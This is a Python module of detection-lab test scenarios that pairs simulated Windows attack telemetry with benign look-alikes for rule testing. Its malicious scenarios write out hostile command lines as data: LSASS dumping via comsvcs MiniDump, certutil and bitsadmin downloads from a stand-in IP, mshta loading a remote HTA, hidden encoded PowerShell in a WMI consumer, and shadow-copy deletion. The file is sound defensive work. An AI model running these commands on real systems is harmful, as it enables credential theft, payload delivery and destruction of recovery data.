"""Corpus scenarios for the tradecraft rules: one documented attack each, and the benign look-alike beside it.

Every malicious scenario here is paired with ordinary activity that resembles it - a backup tool listing
shadow copies, an administrator scheduling a task, antivirus reading LSASS. The benign half is the half that
keeps the rules honest: a rule that fires on its look-alike is counted as a false positive by the lab.
"""

from __future__ import annotations

from datetime import timedelta

from .lab import BENIGN, MALICIOUS, Scenario
from .replay import StreamBuilder

EXPLORER = r"C:\Windows\explorer.exe"
PWSH = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
CMD = r"C:\Windows\System32\cmd.exe"
WINWORD = r"C:\Program Files\Microsoft Office\root\Office16\winword.exe"
LSASS = r"C:\Windows\System32\lsass.exe"
RUNDLL = r"C:\Windows\System32\rundll32.exe"
SCHTASKS = r"C:\Windows\System32\schtasks.exe"
CERTUTIL = r"C:\Windows\System32\certutil.exe"
MSHTA = r"C:\Windows\System32\mshta.exe"
BITSADMIN = r"C:\Windows\System32\bitsadmin.exe"
VSSADMIN = r"C:\Windows\System32\vssadmin.exe"
BCDEDIT = r"C:\Windows\System32\bcdedit.exe"
NOTEPAD = r"C:\Windows\System32\notepad.exe"
DEFENDER = r"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.24090.11-0\MsMpEng.exe"
TEMP_EXE = r"C:\Users\sam\AppData\Local\Temp\update.exe"
SEVENZIP = r"C:\Program Files\7-Zip\7z.exe"
DOCS = r"C:\Users\sam\Documents"


def _lsass_dump_by_handle() -> Scenario:
    b = StreamBuilder()
    b.process_create("X", TEMP_EXE, parent_guid="E", parent_image=EXPLORER)
    b.process_access("X", LSASS, granted_access=0x1410, image=TEMP_EXE)
    return Scenario("lsass_dump_by_handle", MALICIOUS, b.events,
                    expected_rules=frozenset({"cred.lsass_access"}), technique_ids=("T1003.001",),
                    description="A binary in a temp folder opens LSASS with memory-read access.")


def _lsass_dump_comsvcs() -> Scenario:
    b = StreamBuilder()
    b.process_create("C", CMD, parent_guid="E", parent_image=EXPLORER)
    b.process_create("R", RUNDLL, parent_guid="C", parent_image=CMD,
                     command_line=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\l.dmp full")
    return Scenario("lsass_dump_comsvcs", MALICIOUS, b.events,
                    expected_rules=frozenset({"cred.lsass_access"}), technique_ids=("T1003.001",),
                    description="rundll32 calls comsvcs.dll MiniDump to dump a process to disk.")


def _scheduled_task_from_macro() -> Scenario:
    b = StreamBuilder()
    b.process_create("W", WINWORD, parent_guid="E", parent_image=EXPLORER)
    b.process_create("C", CMD, parent_guid="W", parent_image=WINWORD)
    b.process_create("S", SCHTASKS, parent_guid="C", parent_image=CMD,
                     command_line=r'schtasks /create /tn "Updater" /tr "C:\Users\Public\u.exe" /sc onlogon /f')
    return Scenario("scheduled_task_from_macro", MALICIOUS, b.events,
                    expected_rules=frozenset({"persist.scheduled_task"}), technique_ids=("T1053.005",),
                    description="A macro-spawned shell registers a logon task that runs a file in Users\\Public.")


def _wmi_command_consumer() -> Scenario:
    b = StreamBuilder()
    b.wmi_subscription("filter", name="SysHealth", query="SELECT * FROM __InstanceModificationEvent WITHIN 60")
    b.wmi_subscription("consumer", name="SysHealth", consumer_type="Command Line",
                       destination="powershell.exe -nop -w hidden -enc SQBFAFgA")
    b.wmi_subscription("binding", name="SysHealth")
    return Scenario("wmi_command_consumer", MALICIOUS, b.events,
                    expected_rules=frozenset({"persist.wmi_subscription"}), technique_ids=("T1546.003",),
                    description="A permanent WMI subscription whose consumer runs hidden PowerShell.")


def _certutil_download() -> Scenario:
    b = StreamBuilder()
    b.process_create("C", CMD, parent_guid="E", parent_image=EXPLORER)
    b.process_create("U", CERTUTIL, parent_guid="C", parent_image=CMD,
                     command_line=r"certutil.exe -urlcache -split -f http://198.51.100.7/a.exe C:\Users\Public\a.exe")
    return Scenario("certutil_download", MALICIOUS, b.events,
                    expected_rules=frozenset({"exec.lolbin_abuse"}), technique_ids=("T1105",),
                    description="certutil -urlcache used as a downloader.")


def _mshta_remote_script() -> Scenario:
    b = StreamBuilder()
    b.process_create("M", MSHTA, parent_guid="E", parent_image=EXPLORER,
                     command_line="mshta.exe https://example.invalid/payload.hta")
    return Scenario("mshta_remote_script", MALICIOUS, b.events,
                    expected_rules=frozenset({"exec.lolbin_abuse"}), technique_ids=("T1218.005",),
                    description="mshta executes an HTA straight from a URL.")


def _bitsadmin_download() -> Scenario:
    b = StreamBuilder()
    b.process_create("B", BITSADMIN, parent_guid="C", parent_image=CMD,
                     command_line=r"bitsadmin /transfer job /download http://198.51.100.7/b.exe C:\Users\Public\b.exe")
    return Scenario("bitsadmin_download", MALICIOUS, b.events,
                    expected_rules=frozenset({"exec.lolbin_abuse"}), technique_ids=("T1197",),
                    description="bitsadmin /transfer pulls a binary from the internet.")


def _remote_thread_from_script_host() -> Scenario:
    b = StreamBuilder()
    b.process_create("P", PWSH, parent_guid="E", parent_image=EXPLORER)
    b.remote_thread("P", NOTEPAD, image=PWSH, target_guid="N")
    return Scenario("remote_thread_from_script_host", MALICIOUS, b.events,
                    expected_rules=frozenset({"inject.remote_thread"}), technique_ids=("T1055",),
                    description="PowerShell starts a thread inside notepad.exe (process injection).")


def _shadow_copies_deleted() -> Scenario:
    b = StreamBuilder()
    b.process_create("C", CMD, parent_guid="X", parent_image=TEMP_EXE)
    b.process_create("V", VSSADMIN, parent_guid="C", parent_image=CMD,
                     command_line="vssadmin.exe delete shadows /all /quiet")
    b.process_create("B", BCDEDIT, parent_guid="C", parent_image=CMD,
                     command_line="bcdedit /set {default} recoveryenabled no")
    return Scenario("shadow_copies_deleted", MALICIOUS, b.events,
                    expected_rules=frozenset({"impact.recovery_inhibited"}), technique_ids=("T1490",),
                    description="Shadow copies deleted and automatic recovery disabled.")


def _mass_encryption() -> Scenario:
    b = StreamBuilder(step=timedelta(milliseconds=200))
    b.process_create("X", TEMP_EXE, parent_guid="E", parent_image=EXPLORER)
    for i in range(30):
        folder = ("Documents", "Pictures", "Desktop")[i % 3]
        b.file_write("X", rf"C:\Users\sam\{folder}\file{i}.docx.locked", image=TEMP_EXE)
    b.file_write("X", r"C:\Users\sam\Desktop\HOW_TO_DECRYPT.txt", image=TEMP_EXE)
    return Scenario("mass_encryption", MALICIOUS, b.events,
                    expected_rules=frozenset({"impact.mass_file_encryption"}), technique_ids=("T1486",),
                    description="One process writes 30 '<document>.locked' files in six seconds.")


# ---- benign look-alikes ----------------------------------------------------------------------------------


def _defender_reads_lsass() -> Scenario:
    b = StreamBuilder()
    b.process_access("D", LSASS, granted_access=0x1410, image=DEFENDER)
    b.process_access("T", LSASS, granted_access=0x1000, image=TEMP_EXE)  # status query only: no VM_READ
    return Scenario("defender_reads_lsass", BENIGN, b.events,
                    description="Defender reads LSASS; another process only queries its status.")


def _admin_schedules_task() -> Scenario:
    b = StreamBuilder()
    b.process_create("C", CMD, parent_guid="E", parent_image=EXPLORER)
    b.process_create("S", SCHTASKS, parent_guid="C", parent_image=CMD,
                     command_line=r'schtasks /create /tn "Nightly" /tr "C:\Program Files\Backup\run.exe" /sc daily')
    b.process_create("Q", SCHTASKS, parent_guid="C", parent_image=CMD, command_line="schtasks /query /fo list")
    return Scenario("admin_schedules_task", BENIGN, b.events,
                    description="An administrator schedules a nightly job that runs from Program Files.")


def _wmi_logging_consumer() -> Scenario:
    b = StreamBuilder()
    b.wmi_subscription("consumer", name="SCM Event Log Consumer", consumer_type="NT Event Log")
    b.wmi_subscription("filter", name="SCM Event Log Filter", query="select * from MSFT_SCMEventLogEvent")
    return Scenario("wmi_logging_consumer", BENIGN, b.events,
                    description="The built-in WMI consumer that writes to the event log runs no code.")


def _certutil_ordinary_use() -> Scenario:
    b = StreamBuilder()
    b.process_create("U", CERTUTIL, parent_guid="C", parent_image=CMD,
                     command_line=r"certutil -hashfile C:\Users\sam\Downloads\setup.exe SHA256")
    b.process_create("V", CERTUTIL, parent_guid="C", parent_image=CMD, command_line="certutil -store My")
    b.process_create("R", RUNDLL, parent_guid="E", parent_image=EXPLORER,
                     command_line=r"rundll32.exe C:\Windows\System32\shell32.dll,Control_RunDLL")
    return Scenario("certutil_ordinary_use", BENIGN, b.events,
                    description="certutil hashing a file and listing a store; rundll32 opening Control Panel.")


def _shadow_copy_listing() -> Scenario:
    b = StreamBuilder()
    b.process_create("V", VSSADMIN, parent_guid="C", parent_image=CMD, command_line="vssadmin list shadows")
    b.process_create("B", BCDEDIT, parent_guid="C", parent_image=CMD, command_line="bcdedit /enum")
    return Scenario("shadow_copy_listing", BENIGN, b.events,
                    description="Listing shadow copies and boot entries changes nothing.")


def _archive_and_office_saves() -> Scenario:
    b = StreamBuilder(step=timedelta(milliseconds=200))
    b.process_create("Z", SEVENZIP, parent_guid="E", parent_image=EXPLORER)
    for i in range(30):  # compressing each document: a second extension, but an ordinary one
        b.file_write("Z", rf"{DOCS}\report{i}.docx.zip", image=SEVENZIP)
    for i in range(30):  # a sync tool's partial downloads, mixed suffixes
        suffix = ("tmp", "part", "crdownload")[i % 3]
        b.file_write("Y", rf"{DOCS}\photo{i}.jpg.{suffix}", image=r"C:\Program Files\Sync\sync.exe")
    for i in range(40):  # a build writing many plain files
        b.file_write("M", rf"C:\dev\app\obj\unit{i}.obj", image=r"C:\Program Files\MSBuild\msbuild.exe")
    return Scenario("archive_and_office_saves", BENIGN, b.events,
                    description="Bulk file writes by an archiver, a sync client and a compiler.")


def _debugger_remote_thread() -> Scenario:
    b = StreamBuilder()
    b.remote_thread("V", NOTEPAD, image=r"C:\Program Files\Microsoft Visual Studio\Common7\IDE\devenv.exe")
    b.remote_thread("S", NOTEPAD, image=r"C:\Windows\System32\csrss.exe")
    return Scenario("debugger_remote_thread", BENIGN, b.events,
                    description="A debugger and csrss create remote threads as part of normal operation.")


def tradecraft_corpus() -> list[Scenario]:
    return [
        _lsass_dump_by_handle(), _lsass_dump_comsvcs(), _scheduled_task_from_macro(), _wmi_command_consumer(),
        _certutil_download(), _mshta_remote_script(), _bitsadmin_download(), _remote_thread_from_script_host(),
        _shadow_copies_deleted(), _mass_encryption(),
        _defender_reads_lsass(), _admin_schedules_task(), _wmi_logging_consumer(), _certutil_ordinary_use(),
        _shadow_copy_listing(), _archive_and_office_saves(), _debugger_remote_thread(),
    ]
